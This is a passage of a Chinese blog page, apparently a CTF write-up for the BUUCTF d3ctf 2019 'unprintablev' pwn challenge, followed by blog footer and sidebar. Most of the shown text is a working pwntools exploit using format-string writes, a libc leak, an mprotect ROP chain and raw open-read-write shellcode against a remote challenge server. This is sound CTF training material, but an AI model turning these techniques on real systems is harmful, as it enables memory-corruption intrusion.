class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">    main_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">    <span class="comment"># main_addr=u64(p.recv(6).ljust(8,&#x27;\x00&#x27;))</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;main_addr----------&gt;&#x27;</span>, <span class="built_in">hex</span>(main_addr))</span><br><span class="line">    base_addr = main_addr - <span class="number">0xb24</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;base_addr----------&gt;&#x27;</span>, <span class="built_in">hex</span>(base_addr))</span><br><span class="line">    pause()</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">    leak_libc=<span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;leak_libc-------------&gt;&#x27;</span>,<span class="built_in">hex</span>(leak_libc))</span><br><span class="line">    libc_base = leak_libc- <span class="number">0x21b97</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;libc_base---------&gt;&#x27;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">    rsp_hook = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;rsp_hook----------&gt;&#x27;</span>, <span class="built_in">hex</span>(rsp_hook))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    one_gadget = libc_base + <span class="number">0x10a2fc</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;one_gadget--------------------&gt;&#x27;</span>, <span class="built_in">hex</span>(one_gadget))</span><br><span class="line">    high_addr = (one_gadget &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;high_addr---------------------&gt;&#x27;</span>, <span class="built_in">hex</span>(high_addr))</span><br><span class="line">    medium_addr = (one_gadget &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;medium_addr-------------------&gt;&#x27;</span>, <span class="built_in">hex</span>(medium_addr))</span><br><span class="line">    low_addr = (one_gadget) &amp; <span class="number">0xffff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;low_addr----------------------&gt;&#x27;</span>, <span class="built_in">hex</span>(low_addr))</span><br><span class="line"></span><br><span class="line">    rsp_addr = rsp_addr + base_addr</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;rsp_addr-----------------------&gt;&#x27;</span>, <span class="built_in">hex</span>(rsp_addr))</span><br><span class="line">    rsp_addr = rsp_addr &amp; <span class="number">0xffff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;rsp_addr-----------------------&gt;&#x27;</span>, <span class="built_in">hex</span>(rsp_addr))</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    hook1 = (rsp_hook + <span class="number">8</span>) &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;hook1-------------&gt;&#x27;</span>, <span class="built_in">hex</span>(hook1))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(hook1) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将menu函数的返回地址修改成pop rsp</span></span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(rsp_addr) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 写入bss段指针</span></span><br><span class="line">    bss_hook = rsp_hook + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># payload=&#x27;%&#x27;+str(low_addr)+&#x27;c%10$hn&#x27;</span></span><br><span class="line">    <span class="comment"># p.sendline(payload.ljust(0x12c-1,&#x27;\x00&#x27;))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#布置迁移地址bss_addr+8  因为bss要存放d^3CTF</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bss_hook1-------------&gt;&quot;</span>, <span class="built_in">hex</span>(bss_hook))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((bss_hook &amp; <span class="number">0xffff</span>)) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    bss_addr = base_addr + <span class="number">0x202060</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bss1_addr-------------&gt;&quot;</span>, <span class="built_in">hex</span>(bss_addr &amp; <span class="number">0xffff</span>))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((bss_addr+<span class="number">8</span>) &amp; <span class="number">0xffff</span>) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    bss_hook = bss_hook + <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;bss_hook2--------------&gt;&#x27;</span>, <span class="built_in">hex</span>(bss_hook))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((bss_hook &amp; <span class="number">0xffff</span>)) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bss2_addr-------------&gt;&quot;</span>, <span class="built_in">hex</span>((bss_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(((bss_addr) &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    bss_hook = bss_hook + <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;bss_hook3--------------&gt;&#x27;</span>, <span class="built_in">hex</span>(bss_hook))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((bss_hook &amp; <span class="number">0xffff</span>)) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bss2_addr-------------&gt;&quot;</span>, <span class="built_in">hex</span>((bss_addr &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffff</span>))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(((bss_addr) &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffff</span>) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># lb = LibcBox()</span></span><br><span class="line">    <span class="comment"># lb.add_symbol(&#x27;__libc_start_main&#x27;, leak_libc)  # 这个地方跟libcsearcher用法基本一样，下面也是去dump出来</span></span><br><span class="line">    <span class="comment"># lb.search(download_so=1)</span></span><br><span class="line">    <span class="comment"># libc_base = puts_addr - lb.dump(&#x27;__libc_start_main&#x27;)</span></span><br><span class="line"></span><br><span class="line">    mprotect_addr=libc_base+<span class="number">0x11bae0</span></span><br><span class="line">    read_addr=<span class="number">0x116600</span>+libc_base</span><br><span class="line">    write_addr=libc_base+<span class="number">0x1166a0</span></span><br><span class="line">    open_addr=libc_base+<span class="number">0x10fc40</span></span><br><span class="line">    <span class="comment">#mprotect(bss_addr,0x100000,7)</span></span><br><span class="line">    csu1_gadget=base_addr+<span class="number">0xbba</span></span><br><span class="line">    pop_rdx_addr=<span class="number">0x1b96</span>+libc_base</span><br><span class="line">    term_proc=base_addr+<span class="number">0x201DB8</span></span><br><span class="line">    magic_gadget=base_addr+<span class="number">0x8de</span></span><br><span class="line">    pop_rdi_addr=base_addr+<span class="number">0xbc3</span></span><br><span class="line">    pop_rsi_r15_addr=base_addr+<span class="number">0xbc1</span></span><br><span class="line">    </span><br><span class="line">    exit_addr=<span class="number">0x43120</span>+libc_base</span><br><span class="line">    alarm_offset=<span class="number">0xe44f0</span></span><br><span class="line">    alarm_got_addr=<span class="number">0x201FB0</span>+base_addr</span><br><span class="line">    orw_shellcode=<span class="string">&#x27;\x68\x66\x6C\x61\x67\x54\x5F\x6A\x00\x5E\x6A\x02\x58\x0F\x05\x6A\x01\x5F\x54\x5E\x6A\x50\x5A\x6A\x00\x58\x0F\x05\x6A\x02\x5F\x54\x5E\x6A\x50\x5A\x6A\x01\x58\x0F\x05&#x27;</span></span><br><span class="line">    payload=<span class="string">&#x27;d^3CTF\x00\x00&#x27;</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    payload+=p64(pop_rdi_addr)+p64(base_addr+<span class="number">0x202000</span>)</span><br><span class="line">    payload+=p64(pop_rsi_r15_addr)+p64(<span class="number">0x100000</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    payload+=p64(pop_rdx_addr)+p64(<span class="number">7</span>)</span><br><span class="line">    payload+=p64(mprotect_addr)</span><br><span class="line">    payload+=p64(base_addr+<span class="number">0x60</span>+<span class="number">0x202060</span>+<span class="number">0x8</span>)</span><br><span class="line">    payload+=orw_shellcode</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="comment">#p = process(&#x27;./a&#x27;)</span></span><br><span class="line">    p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25582</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">    leak_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(leak_addr &amp; <span class="number">0xffff</span>))</span><br><span class="line">    <span class="keyword">if</span> leak_addr &amp; <span class="number">0xffff</span> &gt; <span class="number">0x2000</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;---------i------------&#x27;</span>, i)</span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.recvuntil(<span class="string">&quot;may you enjoy my printf test!\n&quot;</span>)</span><br><span class="line">        pwn()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这个是本地出的flag</p>
+<p><img src="/upload/img/image-20220429204916689.png" alt="image-20220429204916689"></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>楼上请让路*
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wp.zgroot.cn/BUU/BUUCTF_d3ctf_2019_unprintablev/" title="BUUCTF_d3ctf_unprintablev(2019)">https://wp.zgroot.cn/BUU/BUUCTF_d3ctf_2019_unprintablev/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/PWN/" rel="tag"># PWN</a>
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/%E7%BD%91%E5%88%83%E6%9D%AF/wp_for_wangren/" rel="prev" title="网刃杯部分wp">
+      <i class="fa fa-chevron-left"></i> 网刃杯部分wp
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/PWNHUB/pwnhub_vheap/" rel="next" title="PWNHUB部分wp">
+      PWNHUB部分wp <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="nav-number">1.</span> <span class="nav-text">总结：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%9D%E6%8A%A4%E7%AD%96%E7%95%A5%EF%BC%9A"><span class="nav-number">2.</span> <span class="nav-text">保护策略：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%9A"><span class="nav-number">3.</span> <span class="nav-text">程序分析：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%A7%E8%87%B4%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="nav-number">4.</span> <span class="nav-text">大致思路：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%87%8D%E5%90%AF%E8%BE%93%E5%87%BA"><span class="nav-number">4.1.</span> <span class="nav-text">重启输出</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%83%E7%BD%AE%E6%A0%88%E9%93%BE"><span class="nav-number">4.2.</span> <span class="nav-text">布置栈链</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9IO-2-1-stdout"><span class="nav-number">4.3.</span> <span class="nav-text">修改IO_2_1_stdout</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2%E6%95%B0%E6%8D%AE"><span class="nav-number">4.4.</span> <span class="nav-text">泄露数据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80"><span class="nav-number">4.5.</span> <span class="nav-text">修改返回地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%83%E7%BD%AE%E8%BF%81%E7%A7%BB%E5%9C%B0%E5%9D%80"><span class="nav-number">4.6.</span> <span class="nav-text">布置迁移地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%83%E7%BD%AErop%E9%93%BE"><span class="nav-number">4.7.</span> <span class="nav-text">布置rop链</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-number">5.</span> <span class="nav-text">exp</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96libc%E5%9F%BA%E5%9C%B0%E5%9D%80%EF%BC%8C%E7%94%A8libc%E5%BA%93%E9%87%8C%E7%9A%84gadget%E6%89%A7%E8%A1%8Corw%E8%8E%B7%E5%8F%96flag"><span class="nav-number">5.1.</span> <span class="nav-text">获取libc基地址，用libc库里的gadget执行orw获取flag</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%A8shellcode%E6%89%A7%E8%A1%8Corw"><span class="nav-number">5.2.</span> <span class="nav-text">用shellcode执行orw</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="楼上请让路*"
+      src="/images/image.png">
+  <p class="site-author-name" itemprop="name">楼上请让路*</p>
+  <div class="site-description" itemprop="description">楼上请让路*的WP</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/polishing-labs" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;polishing-labs" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">楼上请让路*</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
